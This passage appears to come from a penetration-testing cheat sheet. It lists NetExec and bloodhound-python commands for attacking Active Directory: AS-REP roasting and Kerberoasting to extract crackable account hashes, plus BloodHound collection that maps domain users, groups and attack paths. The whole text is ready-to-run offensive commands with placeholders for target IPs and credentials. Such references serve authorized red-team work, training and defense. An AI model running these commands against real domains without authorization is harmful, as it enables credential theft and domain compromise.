...
# ASREPRoasting
nxc ldap <ip> -d '<domain_name>' -u '<user>' -p '<password' --asreproast output.txt

# Kerberoast
nxc ldap <ip> -d '<domain_name>' -u '<user>' -p '<password' --kerberoasting output.txt

# Bloodhound (community edition)
nxc ldap <ip> -u user -p pass --bloodhound --collection All --dns-server <DC_ip>
# bloodhound-python is the legacy alternative
bloodhound-python -d <domain.local> -u <username> -p <password> -ns <Domain-Controller-IP> -c All --zip
```
